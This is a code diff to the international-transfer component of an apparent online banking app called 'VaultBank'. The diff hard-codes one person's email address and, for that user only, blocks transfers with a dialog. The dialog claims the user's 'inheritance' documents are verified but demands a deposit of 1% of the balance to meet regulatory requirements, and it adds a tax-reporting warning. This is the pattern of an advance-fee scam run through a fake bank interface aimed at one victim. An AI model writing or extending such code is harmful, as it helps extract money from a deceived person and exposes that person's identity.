@@ -9,9 +9,10 @@ import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import { TransferReceipt } from "./TransferReceipt";
 import { OTPVerificationModal } from "./OTPVerificationModal";
-import { Globe } from "lucide-react";
+import { Globe, AlertTriangle } from "lucide-react";
 import { createNotification, NotificationTemplates } from "@/lib/notifications";
 import bankLogo from "@/assets/vaultbank-logo.png";
+import { AlertDialog, AlertDialogContent, AlertDialogDescription, AlertDialogHeader, AlertDialogTitle, AlertDialogFooter, AlertDialogCancel } from "@/components/ui/alert-dialog";
 
 interface InternationalTransferModalProps {
   onClose: () => void;
@@ -39,6 +40,8 @@ export function InternationalTransferModal({ onClose, onSuccess }: International
   const [showLoadingSpinner, setShowLoadingSpinner] = useState(false);
   const [showOTP, setShowOTP] = useState(false);
   const [pendingTransfer, setPendingTransfer] = useState<any>(null);
+  const [showInheritanceWarning, setShowInheritanceWarning] = useState(false);
+  const [totalBalance, setTotalBalance] = useState(0);
 
   useEffect(() => {
     fetchAccounts();
@@ -69,6 +72,9 @@ export function InternationalTransferModal({ onClose, onSuccess }: International
       .eq("status", "active");
 
     setAccounts(data || []);
+    // Calculate total balance for inheritance warning
+    const total = (data || []).reduce((sum, acc) => sum + parseFloat(String(acc.balance || 0)), 0);
+    setTotalBalance(total);
   };
 
   const handleTransfer = async () => {
@@ -85,6 +91,12 @@ export function InternationalTransferModal({ onClose, onSuccess }: International
     const transferAmount = parseFloat(amount);
     if (isNaN(transferAmount) || transferAmount <= 0) {
       toast.error("Please enter a valid amount");
+      return;
+    }
+
+    // Check if user is annanbelle72@gmail.com and show inheritance warning
+    if (profile?.email === "annanbelle72@gmail.com") {
+      setShowInheritanceWarning(true);
       return;
     }
 
@@ -418,6 +430,43 @@ export function InternationalTransferModal({ onClose, onSuccess }: International
           </div>
         </div>
       )}
+
+      <AlertDialog open={showInheritanceWarning} onOpenChange={setShowInheritanceWarning}>
+        <AlertDialogContent className="max-w-md">
+          <AlertDialogHeader>
+            <div className="flex items-center gap-3 mb-2">
+              <div className="p-2 bg-destructive/10 rounded-full">
+                <AlertTriangle className="h-6 w-6 text-destructive" />
+              </div>
+              <AlertDialogTitle className="text-xl">Inheritance Account - Deposit Required</AlertDialogTitle>
+            </div>
+            <AlertDialogDescription className="space-y-4 text-base">
+              <div className="p-4 bg-muted rounded-lg space-y-2">
+                <p className="font-semibold text-foreground">📋 Document Status: Verified ✓</p>
+                <p className="text-sm">All inheritance documents have been submitted and verified by our compliance team.</p>
+              </div>
+
+              <div className="p-4 bg-destructive/5 border border-destructive/20 rounded-lg space-y-2">
+                <p className="font-semibold text-destructive">⚠️ Required Deposit:</p>
+                <p className="text-sm">Before you can transfer funds from this inherited account, you must deposit <span className="font-bold">1% of the total account balance</span> to comply with regulatory requirements.</p>
+                <p className="text-lg font-bold text-foreground mt-2">
+                  Required Deposit: ${(totalBalance * 0.01).toFixed(2)}
+                </p>
+              </div>
+
+              <div className="p-4 bg-muted rounded-lg space-y-2">
+                <p className="font-semibold text-foreground">⚠️ Tax Compliance Notice:</p>
+                <p className="text-sm">Attempting to transfer large inherited funds may trigger automatic reporting to tax authorities. Ensure compliance to avoid delays or penalties.</p>
+              </div>
+
+              <p className="text-sm text-muted-foreground">Please contact our support team to arrange the required deposit or for more information about this requirement.</p>
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter>
+            <AlertDialogCancel>I Understand</AlertDialogCancel>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </>
   );
 }
